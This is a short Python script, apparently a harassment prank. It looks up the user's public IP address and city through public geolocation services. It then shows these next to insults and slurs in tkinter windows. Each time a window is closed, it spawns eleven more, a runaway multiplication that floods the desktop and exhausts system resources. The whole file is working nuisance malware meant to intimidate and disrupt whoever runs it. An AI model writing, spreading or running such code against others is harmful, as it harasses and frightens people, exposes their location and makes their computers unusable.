import tkinter as tk
import threading
from time import sleep
import socket
import random
import urllib.request
from requests import get
import json

def new_window():
    global counter
    root = tk.Tk()
    root.geometry("200x200")
    root.config(bg="black")
    label = tk.Label(root, text=random.choice(TERMS), bg="black", fg="green")
    label.place(x=random.choice(range(0, 100)), y=random.choice(range(0, 100)))
    root.protocol("WM_DELETE_WINDOW", much_hydra)
    counter += 1
    print(counter)
    root.mainloop()

def much_hydra():
    for i in range(11):
        sleep(0)
        new_window_thread = threading.Thread(target=new_window)
        new_window_thread.start()
        

IP = get('https://api.ipify.org').content.decode('utf8')
LOCATION = json.loads(urllib.request.urlopen(f"http://ip-api.com/json/{IP}").read().decode())
LOCATION_SPECIFIC = f"{LOCATION['regionName']}, {LOCATION['city']}"
TERMS = ['dumb bitch', 'gyattt damn', 'wheres my damn lemons', 'lowkey u look gay', 'I will eat your info in byte sized pieces', 'You fucking school bus', str(IP), LOCATION_SPECIFIC]

counter = 0
og_thread = threading.Thread(target=new_window)
og_thread.start()
og_thread.join()
